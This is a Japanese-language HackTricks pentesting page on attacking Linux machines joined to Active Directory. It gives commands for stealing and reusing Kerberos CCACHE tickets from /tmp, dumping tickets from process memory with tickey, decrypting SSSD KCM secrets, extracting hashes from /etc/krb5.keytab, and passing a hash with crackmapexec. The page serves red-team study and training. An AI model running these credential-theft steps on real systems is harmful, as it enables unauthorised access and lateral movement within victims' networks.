# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Linuxマシンは、Active Directory環境内にも存在する可能性があります。

AD内のLinuxマシンは、**異なるCCACHEチケットをファイル内に保存している可能性があります。このチケットは、他のKerberosチケットと同様に使用および悪用できます**。これらのチケットを読み取るには、チケットのユーザー所有者であるか、**root**である必要があります。

## 列挙

### LinuxからのAD列挙

Linux（またはWindowsのbash）でADにアクセスできる場合、[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を試してADを列挙できます。

LinuxからADを列挙する**他の方法**を学ぶには、次のページを確認できます：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPAは、主に**Unix**環境向けのMicrosoft Windows **Active Directory**のオープンソース**代替**です。Active Directoryに類似した管理のために、完全な**LDAPディレクトリ**とMIT **Kerberos**キー配布センターを組み合わせています。CAおよびRA証明書管理のためにDogtag **Certificate System**を利用し、スマートカードを含む**多要素**認証をサポートしています。Unix認証プロセスのためにSSSDが統合されています。詳細については、以下を参照してください：

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## チケットを使った遊び

### パス・ザ・チケット

このページでは、**Linuxホスト内でKerberosチケットを見つけることができるさまざまな場所**を見つけることができます。次のページでは、このCCacheチケット形式をKirbi（Windowsで使用する必要がある形式）に変換する方法と、PTT攻撃を実行する方法を学ぶことができます：

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmpからのCCACHEチケット再利用

CCACHEファイルは、**Kerberos資格情報**を保存するためのバイナリ形式で、通常は`/tmp`に600の権限で保存されます。これらのファイルは、ユーザーのUIDに関連する**名前形式、`krb5cc_%{uid}`**で識別できます。認証チケットの検証には、**環境変数`KRB5CCNAME`**を希望するチケットファイルのパスに設定する必要があり、再利用を可能にします。

`env | grep KRB5CCNAME`を使用して、認証に使用されている現在のチケットをリストします。形式はポータブルで、環境変数を設定することでチケットを**再利用できます**。`export KRB5CCNAME=/tmp/ticket.ccache`を使用します。Kerberosチケットの名前形式は`krb5cc_%{uid}`で、uidはユーザーのUIDです。
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE チケットの再利用とキーチェーン

**プロセスのメモリに保存された Kerberos チケットは抽出可能です**。特に、マシンの ptrace 保護が無効になっている場合（`/proc/sys/kernel/yama/ptrace_scope`）。この目的に役立つツールは [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) にあり、セッションに注入してチケットを `/tmp` にダンプすることで抽出を容易にします。

このツールを設定して使用するには、以下の手順に従います：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
この手順は、さまざまなセッションに注入を試み、抽出されたチケットを`/tmp`に`__krb_UID.ccache`という命名規則で保存することで成功を示します。

### SSSD KCMからのCCACHEチケットの再利用

SSSDは、`/var/lib/sss/secrets/secrets.ldb`のパスにデータベースのコピーを保持しています。対応するキーは、`/var/lib/sss/secrets/.secrets.mkey`のパスに隠しファイルとして保存されています。デフォルトでは、キーは**root**権限を持っている場合にのみ読み取ることができます。

\*\*`SSSDKCMExtractor` \*\*を--databaseおよび--keyパラメータで呼び出すと、データベースを解析し、**秘密を復号化**します。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**資格情報キャッシュKerberosブロブは、Mimikatz/Rubeusに渡すことができる使用可能なKerberos CCache**ファイルに変換できます。

### keytabからのCCACHEチケット再利用
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab からアカウントを抽出する

サービスアカウントキーは、ルート権限で動作するサービスに不可欠であり、**`/etc/krb5.keytab`** ファイルに安全に保存されています。これらのキーは、サービスのパスワードに似ており、厳格な機密性が求められます。

keytabファイルの内容を確認するには、**`klist`** を使用できます。このツールは、特にキータイプが23として識別される場合に、ユーザー認証のための**NT Hash**を含むキーの詳細を表示するように設計されています。
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linuxユーザーにとって、**`KeyTabExtract`** はRC4 HMACハッシュを抽出する機能を提供し、これをNTLMハッシュの再利用に活用できます。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOSでは、**`bifrost`**はkeytabファイル分析のためのツールとして機能します。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
抽出したアカウントとハッシュ情報を利用して、**`crackmapexec`** のようなツールを使用してサーバーへの接続を確立できます。
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## 参考文献
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
